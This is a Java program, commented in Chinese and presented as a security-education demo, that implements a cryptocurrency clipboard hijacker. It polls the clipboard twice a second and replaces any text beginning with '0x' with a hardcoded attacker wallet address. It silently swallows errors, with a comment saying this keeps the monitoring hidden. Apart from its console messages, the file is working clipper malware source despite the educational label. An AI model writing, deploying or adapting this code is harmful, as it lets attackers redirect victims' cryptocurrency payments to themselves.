import java.awt.*;
import java.awt.datatransfer.*;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.Pattern;

/**
 * 剪贴板劫持演示程序 - 仅供安全教育用途
 * 功能：监控剪贴板，检测到加密货币地址时自动替换
 */
public class ClipboardMonitorDemo {
    
    // 模拟攻击者地址(不一定合法，只是演示用)，只用于教育和演示，不能用于实际攻击
    private static final String MALICIOUS_ADDRESS = "0x953a2Ea1b3c8d9e0f7a2b4c6d8e0f1a3b5c7d9e"; 
    private static String lastClipboardContent = "";
    private static volatile boolean isReplacing = false;
    
    public static void main(String[] args) {
        System.out.println("🚨 剪贴板监控演示启动 - 安全教育用途");
        System.out.println("监控模式：检测到0x开头地址将替换为: " + MALICIOUS_ADDRESS);
        
        startMonitoring();
    }
    
    private static void startMonitoring() {
        Timer timer = new Timer(true);
        timer.scheduleAtFixedRate(new ClipboardCheckTask(), 0, 500); // 每500ms检查一次
        
        // 添加关闭钩子
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            System.out.println("监控程序已停止");
        }));
        
        // 保持程序运行，等待用户手动退出
        System.out.println("程序正在运行中... 按 Ctrl+C 退出");
        try {
            // 使用无限循环保持程序运行
            while (true) {
                Thread.sleep(1000); // 每秒检查一次程序状态
            }
        } catch (InterruptedException e) {
            System.out.println("程序被中断，正在退出...");
        }
    }
    
    static class ClipboardCheckTask extends TimerTask {
        @Override
        public void run() {
            try {
                checkClipboard();
            } catch (Exception e) {
                // 静默处理异常，避免暴露监控行为
            }
        }
        
        private void checkClipboard() {
            Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
            Transferable contents = clipboard.getContents(null);
            
            if (contents != null && contents.isDataFlavorSupported(DataFlavor.stringFlavor)) {
                try {
                    String text = (String) contents.getTransferData(DataFlavor.stringFlavor);
                    
                    // 避免重复处理和自身触发循环
                    if (text == null || text.equals(lastClipboardContent) || isReplacing) {
                        return;
                    }
                    
                    lastClipboardContent = text;
                    
                    // 检测加密货币地址
                    if (isCryptoAddress(text)) {
                        System.out.println("[检测] 发现疑似地址: " + abbreviateAddress(text));
                        replaceClipboardContent();
                    }
                    
                } catch (Exception e) {
                    // 静默处理
                }
            }
        }
        
        private boolean isCryptoAddress(String text) {
            String trimmed = text.trim();
            // 简单的加密货币地址检测逻辑
            return trimmed.startsWith("0x") && trimmed.length() > 10;
            
        }
        
        private void replaceClipboardContent() {
            isReplacing = true;
            try {
                StringSelection newContent = new StringSelection(MALICIOUS_ADDRESS);
                Toolkit.getDefaultToolkit().getSystemClipboard().setContents(newContent, null);
                
                System.out.println("⚠️  [已替换] 原始地址已被替换为: " + MALICIOUS_ADDRESS);
                System.out.println("🔒 安全教育提示：这正是黑客攻击的手段！");
                
            } finally {
                // 短暂延迟后重置标志，避免循环
                new Timer().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        isReplacing = false;
                    }
                }, 100);
            }
        }
        
        private String abbreviateAddress(String address) {
            if (address.length() <= 12) return address;
            return address.substring(0, 8) + "..." + address.substring(address.length() - 4);
        }
    }
}
